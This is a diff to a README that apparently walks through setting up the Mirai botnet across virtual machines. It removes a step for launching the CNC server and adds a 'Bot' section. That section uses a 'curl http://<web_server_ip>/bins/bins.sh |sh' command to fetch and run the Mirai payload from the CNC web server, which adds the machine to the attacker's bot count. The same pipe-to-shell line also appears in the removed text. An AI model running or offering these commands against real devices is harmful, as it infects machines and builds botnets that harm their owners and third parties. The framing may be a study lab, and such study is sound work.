@@ -206,16 +206,16 @@ cd release
 sudo bash ../apache2.sh
 ```
 <br>
+Type in the web server IP as the IP of CNC server on the internal network interface.
 
-Now lets run the cnc:
+
+## Virtual Machine - 3 Bot
+
+To load mirai on to this you just need to curl the CNC server:
+
 ```
-cd release
-sudo screen -dmS mirai-cnc ./cnc
+curl http://<web_server_ip>/bins/bins.sh |sh
 ```
 <br>
 
-If you did everything right you can now load mirai onto a device with:
-```
-curl http://<your ip>/bins/bins.sh |sh
-```
-<br>
+After this you can see that in the attackers terminal the bot count would have increased by 1.
